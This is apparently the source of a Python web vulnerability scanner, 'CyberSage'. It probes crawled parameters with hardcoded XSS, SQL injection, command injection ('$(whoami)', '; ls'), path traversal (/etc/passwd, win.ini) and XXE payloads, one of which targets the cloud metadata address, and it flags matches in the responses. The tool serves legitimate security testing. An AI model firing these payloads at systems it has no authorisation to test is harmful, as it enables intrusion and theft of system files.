"""
Detailed Vulnerability Scanner with Real-time Visibility
Shows exactly which payload is attacking which parameter and URL
"""

import time
import requests
from urllib.parse import urlparse, parse_qs, quote, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import json

class DetailedScanner:
    """
    Scanner with detailed attack visibility and logging
    """
    
    def __init__(self, broadcaster=None):
        self.broadcaster = broadcaster
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (CyberSage Security Scanner)'
        })
        
        # Attack tracking
        self.current_attack = None
        self.attack_log = []
        self.vulnerabilities = []
        self.total_tests = 0
        self.tests_completed = 0
        
        # Scope control
        self.scope_domain = None
        self.allowed_domains = set()
    
    def set_scope(self, target_url):
        """Set scanning scope"""
        parsed = urlparse(target_url)
        self.scope_domain = parsed.netloc
        self.allowed_domains.add(parsed.netloc)
        
        # Add variations
        if not parsed.netloc.startswith('www.'):
            self.allowed_domains.add(f"www.{parsed.netloc}")
        else:
            self.allowed_domains.add(parsed.netloc.replace('www.', ''))
    
    def is_in_scope(self, url):
        """Check if URL is in scope"""
        parsed = urlparse(url)
        return parsed.netloc in self.allowed_domains or not parsed.netloc
    
    def scan_with_details(self, crawl_report, scan_config=None):
        """
        Perform detailed scanning with real-time visibility
        """
        self.attack_log = []
        self.vulnerabilities = []
        
        # Extract targets from crawl report
        targets = self._prepare_targets(crawl_report)
        
        # Calculate total tests
        self.total_tests = self._calculate_total_tests(targets)
        self.tests_completed = 0
        
        if self.broadcaster:
            self.broadcaster.send_log(f"[Scanner] Starting detailed scan")
            self.broadcaster.send_log(f"[Scanner] Total tests to perform: {self.total_tests}")
        
        # Scan each target
        for target in targets:
            if not self.is_in_scope(target['url']):
                self._log_attack('SKIPPED', target['url'], None, None, "Out of scope")
                continue
            
            self._scan_target(target, scan_config)
        
        # Generate detailed report
        return self._generate_scan_report()
    
    def _prepare_targets(self, crawl_report):
        """
        Prepare scanning targets from crawl report
        """
        targets = []
        
        # URLs with parameters
        for url, params in crawl_report.get('parameters', {}).items():
            targets.append({
                'url': url,
                'type': 'url',
                'parameters': params,
                'method': 'GET'
            })
        
        # Forms
        for form in crawl_report.get('forms', []):
            targets.append({
                'url': form['action'],
                'type': 'form',
                'parameters': form['parameters'],
                'method': form['method']
            })
        
        # API endpoints
        for api in crawl_report.get('api_endpoints', []):
            targets.append({
                'url': api['url'],
                'type': 'api',
                'parameters': {},
                'method': api.get('method', 'GET')
            })
        
        return targets
    
    def _calculate_total_tests(self, targets):
        """
        Calculate total number of tests
        """
        total = 0
        
        for target in targets:
            # Count parameters
            param_count = len(target.get('parameters', {}))
            if param_count == 0:
                param_count = 1  # At least one test per URL
            
            # Multiply by number of payload categories
            payload_categories = 5  # XSS, SQLi, Command, Path, etc.
            payloads_per_category = 10  # Average payloads per category
            
            total += param_count * payload_categories * payloads_per_category
        
        return total
    
    def _scan_target(self, target, scan_config):
        """
        Scan a single target with detailed logging
        """
        url = target['url']
        parameters = target.get('parameters', {})
        method = target.get('method', 'GET')
        
        # Log target scan start
        self._log_attack('SCAN_START', url, None, None, f"Scanning {len(parameters)} parameters")
        
        if self.broadcaster:
            self.broadcaster.send_log(f"[Scanner] Scanning: {url}")
            self.broadcaster.send_log(f"[Scanner] Method: {method}, Parameters: {list(parameters.keys())}")
        
        # Test each parameter
        for param_name, param_info in parameters.items():
            param_value = param_info.get('value', '') if isinstance(param_info, dict) else param_info
            
            # Test with different payload categories
            self._test_xss(url, param_name, param_value, method)
            self._test_sqli(url, param_name, param_value, method)
            self._test_command_injection(url, param_name, param_value, method)
            self._test_path_traversal(url, param_name, param_value, method)
            self._test_xxe(url, param_name, param_value, method)
    
    def _test_xss(self, url, param_name, param_value, method):
        """
        Test for XSS with detailed logging
        """
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '<body onload=alert(1)>',
            '\'><script>alert(1)</script>',
            '<iframe src=javascript:alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>'
        ]
        
        for payload in xss_payloads:
            self._execute_attack(url, param_name, param_value, payload, 'XSS', method)
    
    def _test_sqli(self, url, param_name, param_value, method):
        """
        Test for SQL injection with detailed logging
        """
        sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--"
        ]
        
        for payload in sqli_payloads:
            self._execute_attack(url, param_name, param_value, payload, 'SQLi', method)
    
    def _test_command_injection(self, url, param_name, param_value, method):
        """
        Test for command injection with detailed logging
        """
        cmd_payloads = [
            '; ls',
            '| ls',
            '& dir',
            '&& whoami',
            '`id`',
            '$(whoami)',
            '; sleep 5',
            '| sleep 5',
            '; ping -c 5 127.0.0.1',
            '& ping -n 5 127.0.0.1'
        ]
        
        for payload in cmd_payloads:
            self._execute_attack(url, param_name, param_value, payload, 'Command', method)
    
    def _test_path_traversal(self, url, param_name, param_value, method):
        """
        Test for path traversal with detailed logging
        """
        path_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//etc/passwd',
            'file:///etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '/var/www/../../etc/passwd',
            'C:\\..\\..\\windows\\win.ini',
            '..;/..;/..;/etc/passwd',
            '..//..//..//etc/passwd'
        ]
        
        for payload in path_payloads:
            self._execute_attack(url, param_name, param_value, payload, 'Path Traversal', method)
    
    def _test_xxe(self, url, param_name, param_value, method):
        """
        Test for XXE with detailed logging
        """
        if method != 'POST':
            return
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/">]><root>&test;</root>'
        ]
        
        for payload in xxe_payloads:
            self._execute_attack(url, param_name, param_value, payload, 'XXE', method)
    
    def _execute_attack(self, url, param_name, param_value, payload, attack_type, method):
        """
        Execute a single attack with detailed logging
        """
        self.tests_completed += 1
        
        # Build attack details
        attack_details = {
            'url': url,
            'parameter': param_name,
            'original_value': param_value,
            'payload': payload,
            'type': attack_type,
            'method': method,
            'timestamp': time.time()
        }
        
        # Log attack start
        self._log_attack('ATTACKING', url, param_name, payload, attack_type)
        
        # Show real-time attack details
        if self.broadcaster:
            progress = (self.tests_completed / self.total_tests) * 100 if self.total_tests > 0 else 0
            self.broadcaster.send_log(
                f"[Attack {self.tests_completed}/{self.total_tests}] ({progress:.1f}%) "
                f"{attack_type} -> {param_name} @ {url[:50]}..."
            )
            self.broadcaster.send_log(f"  Payload: {payload[:100]}")
        
        try:
            # Build request
            if method == 'GET':
                # URL parameter injection
                test_url = self._build_test_url(url, param_name, param_value, payload)
                
                # Check if URL goes out of scope after payload
                if not self.is_in_scope(test_url):
                    self._log_attack('BLOCKED', url, param_name, payload, "Would redirect out of scope")
                    return
                
                # Time the request for timing attacks
                start_time = time.time()
                response = self.session.get(test_url, timeout=10, verify=False, allow_redirects=False)
                elapsed = time.time() - start_time
                
            else:  # POST
                # Form/body parameter injection
                data = {param_name: payload}
                
                start_time = time.time()
                response = self.session.post(url, data=data, timeout=10, verify=False, allow_redirects=False)
                elapsed = time.time() - start_time
            
            # Check for redirect out of scope
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location and not self.is_in_scope(location):
                    self._log_attack('REDIRECT_BLOCKED', url, param_name, payload, 
                                   f"Attempted redirect to: {location}")
                    return
            
            # Analyze response for vulnerabilities
            vuln = self._analyze_response(response, elapsed, attack_details)
            
            if vuln:
                self.vulnerabilities.append(vuln)
                self._log_attack('VULNERABLE', url, param_name, payload, 
                               f"{attack_type} vulnerability found!")
                
                if self.broadcaster:
                    self.broadcaster.send_log(f"[VULNERABILITY] {attack_type} found in {param_name} at {url}")
            else:
                self._log_attack('TESTED', url, param_name, payload, "No vulnerability detected")
            
        except requests.exceptions.Timeout:
            # Timeout might indicate time-based vulnerability
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                vuln = {
                    'type': f'{attack_type} (Time-based)',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': 'Request timed out',
                    'confidence': 80,
                    'severity': 'high'
                }
                self.vulnerabilities.append(vuln)
                self._log_attack('VULNERABLE', url, param_name, payload, "Time-based vulnerability!")
            else:
                self._log_attack('TIMEOUT', url, param_name, payload, "Request timed out")
                
        except requests.exceptions.ConnectionError:
            self._log_attack('ERROR', url, param_name, payload, "Connection error")
            
        except Exception as e:
            self._log_attack('ERROR', url, param_name, payload, str(e))
    
    def _build_test_url(self, url, param_name, param_value, payload):
        """
        Build test URL with payload
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Replace parameter value with payload
        params[param_name] = [payload]
        
        # Rebuild query string
        new_query = '&'.join([f"{k}={quote(v[0])}" for k, v in params.items()])
        
        # Rebuild URL
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if new_query:
            test_url += f"?{new_query}"
        
        return test_url
    
    def _analyze_response(self, response, elapsed_time, attack_details):
        """
        Analyze response for vulnerabilities
        """
        content = response.text
        attack_type = attack_details['type']
        payload = attack_details['payload']
        
        # Check for payload reflection (XSS)
        if attack_type == 'XSS' and (payload in content or quote(payload) in content):
            return {
                'type': 'Cross-Site Scripting (XSS)',
                'url': attack_details['url'],
                'parameter': attack_details['parameter'],
                'payload': payload,
                'evidence': 'Payload reflected in response',
                'confidence': 90,
                'severity': 'high',
                'details': attack_details
            }
        
        # Check for SQL errors
        sql_errors = [
            'SQL syntax', 'mysql_', 'mysqli_', 'ORA-', 'PostgreSQL',
            'SQLServer', 'sqlite', 'Database error', 'SQLSTATE'
        ]
        
        if attack_type == 'SQLi':
            for error in sql_errors:
                if error in content:
                    return {
                        'type': 'SQL Injection',
                        'url': attack_details['url'],
                        'parameter': attack_details['parameter'],
                        'payload': payload,
                        'evidence': f'SQL error detected: {error}',
                        'confidence': 95,
                        'severity': 'critical',
                        'details': attack_details
                    }
            
            # Time-based SQLi
            if elapsed_time > 5 and ('sleep' in payload.lower() or 'waitfor' in payload.lower()):
                return {
                    'type': 'SQL Injection (Time-based)',
                    'url': attack_details['url'],
                    'parameter': attack_details['parameter'],
                    'payload': payload,
                    'evidence': f'Response delayed by {elapsed_time:.2f} seconds',
                    'confidence': 90,
                    'severity': 'critical',
                    'details': attack_details
                }
        
        # Check for command execution evidence
        if attack_type == 'Command':
            cmd_evidence = [
                'uid=', 'gid=', 'groups=', 'root:', 'bin:',
                'drwx', 'total ', 'Directory of', 'Volume in drive'
            ]
            
            for evidence in cmd_evidence:
                if evidence in content:
                    return {
                        'type': 'Command Injection',
                        'url': attack_details['url'],
                        'parameter': attack_details['parameter'],
                        'payload': payload,
                        'evidence': f'Command output detected: {evidence}',
                        'confidence': 95,
                        'severity': 'critical',
                        'details': attack_details
                    }
            
            # Time-based command injection
            if elapsed_time > 5 and 'sleep' in payload:
                return {
                    'type': 'Command Injection (Time-based)',
                    'url': attack_details['url'],
                    'parameter': attack_details['parameter'],
                    'payload': payload,
                    'evidence': f'Response delayed by {elapsed_time:.2f} seconds',
                    'confidence': 90,
                    'severity': 'critical',
                    'details': attack_details
                }
        
        # Check for path traversal success
        if attack_type == 'Path Traversal':
            traversal_evidence = [
                'root:x:', 'daemon:', 'bin:', '[boot loader]',
                '[fonts]', '[extensions]', 'for 16-bit app support'
            ]
            
            for evidence in traversal_evidence:
                if evidence in content:
                    return {
                        'type': 'Path Traversal',
                        'url': attack_details['url'],
                        'parameter': attack_details['parameter'],
                        'payload': payload,
                        'evidence': f'System file accessed: {evidence}',
                        'confidence': 95,
                        'severity': 'high',
                        'details': attack_details
                    }
        
        # Check for XXE
        if attack_type == 'XXE':
            if 'root:' in content or 'ami-id' in content:
                return {
                    'type': 'XML External Entity (XXE)',
                    'url': attack_details['url'],
                    'parameter': attack_details['parameter'],
                    'payload': payload[:100] + '...',
                    'evidence': 'External entity processed',
                    'confidence': 90,
                    'severity': 'high',
                    'details': attack_details
                }
        
        return None
    
    def _log_attack(self, status, url, parameter, payload, message):
        """
        Log attack details
        """
        log_entry = {
            'timestamp': time.time(),
            'status': status,
            'url': url,
            'parameter': parameter,
            'payload': payload[:100] if payload else None,
            'message': message
        }
        
        self.attack_log.append(log_entry)
        
        # Console output for debugging
        if status in ['ATTACKING', 'VULNERABLE']:
            print(f"[{status}] {parameter} @ {url[:50]}... : {message}")
    
    def _generate_scan_report(self):
        """
        Generate detailed scan report
        """
        report = {
            'summary': {
                'total_tests': self.total_tests,
                'tests_completed': self.tests_completed,
                'vulnerabilities_found': len(self.vulnerabilities),
                'scan_duration': time.time() - self.attack_log[0]['timestamp'] if self.attack_log else 0
            },
            'vulnerabilities': self.vulnerabilities,
            'attack_log': self.attack_log[-500:],  # Last 500 attacks
            'statistics': self._generate_statistics()
        }
        
        if self.broadcaster:
            self.broadcaster.send_log(f"[Scanner] Scan complete: {self.tests_completed} tests performed")
            self.broadcaster.send_log(f"[Scanner] Vulnerabilities found: {len(self.vulnerabilities)}")
        
        return report
    
    def _generate_statistics(self):
        """
        Generate scan statistics
        """
        stats = {
            'by_type': {},
            'by_severity': {},
            'by_parameter': {},
            'by_url': {}
        }
        
        for vuln in self.vulnerabilities:
            # By type
            vuln_type = vuln['type']
            stats['by_type'][vuln_type] = stats['by_type'].get(vuln_type, 0) + 1
            
            # By severity
            severity = vuln.get('severity', 'unknown')
            stats['by_severity'][severity] = stats['by_severity'].get(severity, 0) + 1
            
            # By parameter
            param = vuln.get('parameter', 'unknown')
            stats['by_parameter'][param] = stats['by_parameter'].get(param, 0) + 1
            
            # By URL
            url = vuln.get('url', 'unknown')
            parsed = urlparse(url)
            path = parsed.path or '/'
            stats['by_url'][path] = stats['by_url'].get(path, 0) + 1
        
        return stats
    
    def get_scan_progress(self):
        """
        Get real-time scan progress
        """
        return {
            'total_tests': self.total_tests,
            'completed': self.tests_completed,
            'progress_percent': (self.tests_completed / self.total_tests * 100) if self.total_tests > 0 else 0,
            'vulnerabilities_found': len(self.vulnerabilities),
            'current_attack': self.current_attack,
            'last_attacks': self.attack_log[-10:]  # Last 10 attacks
        }
